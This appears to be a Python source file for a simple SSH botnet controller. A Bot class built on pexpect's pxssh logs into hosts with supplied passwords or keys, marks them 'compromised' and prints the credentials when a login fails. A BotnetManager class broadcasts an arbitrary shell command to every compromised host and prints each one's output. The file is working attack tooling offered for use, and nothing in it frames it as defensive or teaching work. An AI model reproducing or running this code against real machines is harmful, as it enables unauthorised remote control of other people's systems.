"""
:
"""
from subprocess import check_output

from pexpect import pxssh





def run_command(cmd):
    return check_output(cmd.split(' ')).decode().strip()


class Bot(pxssh.pxssh):
    """
    an extension of the pxssh class
    used to manage and abstract attributes and actions
    """
    _DEFAULT_TIMEOUT = 1

    def __init__(self, host, user, passwd, pem_file=None):
        pxssh.pxssh.__init__(self)
        self._host = host
        self._user = user
        self._passwd = passwd
        self._pem = pem_file
        self._is_compromised = False

        self._establish_connection()    # used to test login capabilities


    def _establish_connection(self):
        print(f"[+] Attempting to connect to {self._host}...")

        try:
            if self._pem is None:
                self.login(self._host, self._user, self._passwd,
                           login_timeout=self._DEFAULT_TIMEOUT)
            else:
                self.login(self._host, self._user, ssh_key=self._pem,
                           login_timeout=self._DEFAULT_TIMEOUT)

        except pxssh.ExceptionPxssh as ssh_err:
            print(f"[ERROR]: {ssh_err}")
            unsuccessful_output = f"[-] Unable to connect to {self._host} using "
            unsuccessful_output += f"user={self._user} and passwd={self._passwd}"
            print(unsuccessful_output, end='\n\n')
            return

        self._is_compromised = True
        print(f"[+] Connection Established with {self._host}", end='\n\n')



    def is_available(self):
        return self._is_compromised


    def run_command(self, command):
        self.sendline(command)
        self.prompt()
        return self.before.decode()


    # def __repr__(self):
    #     """
    #     self._host = host
    #     self._user = user
    #     self._passwd = passwd
    #     """
    #     output = f"HOST: {self._host}\nNAME: {self._user}\n"
    #     output += f"PASS: {self._passwd}\nAVAIL: {self._is_compromised}\n"
    #     return output



class BotnetManager:
    """manages a collection of bots used in a botnet"""
    _DEFAULT_TIMEOUT = 1

    def __init__(self):
        self._bots = []


    def add_bot(self, host, user, passwd):
        bot = Bot(host, user, passwd)
        self._bots.append(bot)


    def list_bots(self):
        for bot in self._bots:
            print(bot)


    def send_command(self, command):
        for idn, bot in enumerate(self._bots):
            if bot.is_available():
                output = bot.run_command(command).split('\r\n ')[-1]
                print(f"[Bot-{idn}]: {output}")
